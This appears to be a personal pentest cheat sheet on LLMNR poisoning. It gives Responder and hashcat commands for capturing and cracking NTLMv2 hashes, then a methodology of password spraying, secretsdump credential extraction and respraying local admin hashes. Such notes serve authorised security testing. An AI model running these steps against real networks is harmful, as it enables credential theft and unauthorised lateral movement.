---
title: LLMNR POISONING
updated: 2023-09-29 03:06:14Z
created: 2023-09-29 02:59:58Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# LLMNR POISONING
## Crack the hashes
1. `sudo responder -I eth0 -dwPv`
2. Copy captured hash to **hashes.txt**
3. `hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt` 
use ***--show*** to list already cracked hashes
use ***--force*** for running on VM
use ***-O*** on bare metal
5. Get target to browse incorrect share eg **\\\hackm**

***
## Methodology
1. Run **LLMNR Poisoning** (**not longer than 5-10mins at a time!!**)
2. Grab hash of *user*
3. Use **hashcat** to crack *user* hash
4. spray the password
5. Find new logins (hopefully)
6. **secretsdump.py** those logins
7. Grab local admin hashes
8. Respray the network with local accounts